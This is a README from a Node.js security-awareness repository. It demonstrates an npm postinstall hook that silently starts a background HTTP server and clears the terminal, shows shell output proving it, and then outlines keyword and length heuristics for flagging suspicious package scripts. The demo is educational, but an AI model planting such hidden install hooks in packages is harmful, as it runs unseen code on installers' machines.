# don't do bad things with node

Node.js as a young technology is great but also great for misuse. Go (!) and support (!) **[THE NODE SECURITY PROJECT](http://nodesecurity.io/)**

# about this repo

Here I am showing misuse to make you (and me) more mindful. It is easy, just look inside the code of others, support projects like the node security project and do good things!

Let's dive into some code:

# NPM MISUSE #1

NPM is so great! [Isaac](https://github.com/isaacs‎) did a great job! But, you have to use it mindful. Look at the following example, it is a minimal npm `package.json` **but** if I write it like this, I am able to do whatever I want on your system if you are going to install my package. Like starting a webserver on port `1337` **and hiding it from you**.

```json
{
  "name": "test",
  "scripts": {
    "postinstall": "echo 'var http=require(\"http\");http.createServer(function (req, res) {res.writeHead(200, {\"Content-Type\": \"text/plain\"}); res.end(\"hi, i just started a background http server at your system. You should be patient! \");}).listen(1337);//console.log(\"Server running at http://127.0.0.1:1337/\")' | node & clear;"
  }
}
```


```shell
$ ps
  PID TTY           TIME CMD
  586 ttys000    0:00.55 /bin/zsh
  903 ttys001    0:00.07 /bin/zsh

$ npm install
$ 

$ ps
  PID TTY           TIME CMD
  586 ttys000    0:00.56 /bin/zsh
 1555 ttys000    0:00.05 node
  903 ttys001    0:00.07 /bin/zsh

$ curl localhost:1337
hi, i just started a background http server at your system. You should be patient! %
```

as you can see, I am piping a text string to node, putting the node process into the background and clearing the screen. So, please be mindful and support security projects.

# An auto checking approach

This is just an approach, a test how to make an automated testing system to find suspicious code inside the npm's scripts-object.

### Key "suspicious code" indicators

* The `value` of a key inside the script-object is longer than `80` characters
 * example: `node runmyprettylongjs.withsubname.js -flag 1 -flag 2 -flag 3 -flag 4 -flag 5 -n` thats still OK but anything longer than that is *suspicious* and should be checked.
* Unix / Win-Shell commands like:
 * `fdisk` (of cause)
 * and all from [evil *nix commands](http://www.wiki.darksyndicate.net/index.php?title=Evil_*nix_Commands&printable=yes)

So, for an automatic detection *length* and *suspicious characters* like `/`, `\`, `=/`, `/;`, `*` are indicators. Plus unix system keywords like `cd`, `rm`, `mv`, `cp`, `dd`, `awk`, `chmod` and some others.

Of cause, some of these commands can be used to do good things. These indicators should just be used to pre-filter package.json files.
